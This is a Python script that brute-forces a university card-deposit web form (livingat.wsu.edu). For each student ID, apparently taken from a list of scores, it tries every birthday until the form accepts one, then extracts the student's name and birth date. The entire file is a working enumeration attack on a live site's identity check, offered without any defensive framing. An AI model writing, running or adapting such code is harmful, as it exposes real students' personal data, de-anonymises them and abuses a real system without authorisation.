import requests
from bs4 import BeautifulSoup

from ids import id_to_score
from birthdays import birthdays

s = requests.session()


# TODO: Async requests
def get_info(wsu_id):
    response = s.get(
        "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC",
    )
    bs = BeautifulSoup(response.text, 'html.parser')

    # Get hidden inputs
    view_state = bs.find(id="__VIEWSTATE").get('value')
    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')
    event_val = bs.find(id="__EVENTVALIDATION").get('value')

    for birthday in birthdays:
        print("Trying {} on ID {}".format(birthday, wsu_id))
        response = s.post(
            "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC",
            data={
                "__EVENTTARGET": "ctl00$mainContent$btnContinue",
                "__VIEWSTATE": view_state,
                "__PREVIOUSPAGE": prev_page,
                "__EVENTVALIDATION": event_val,
                "ctl00$mainContent$txtWSUID": wsu_id,
                "ctl00$mainContent$DropDownListMonth": birthday.month,
                "ctl00$mainContent$DropDownListDay": birthday.day,
            },
        )

        if "Birthday is incorrect" not in response.text:
            bs = BeautifulSoup(response.text, 'html.parser')
            name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")
            return name, birthday
    else:
        raise ValueError("{} has no birthday!".format(wsu_id))


def get_all_info(wsu_ids):
    all_info = {}
    for wsu_id in wsu_ids:
        info = get_info(wsu_id)

        all_info[wsu_id] = info

    return all_info


def main():
    all_info = get_all_info(id_to_score)

    print(all_info)


if __name__ == '__main__':
    main()
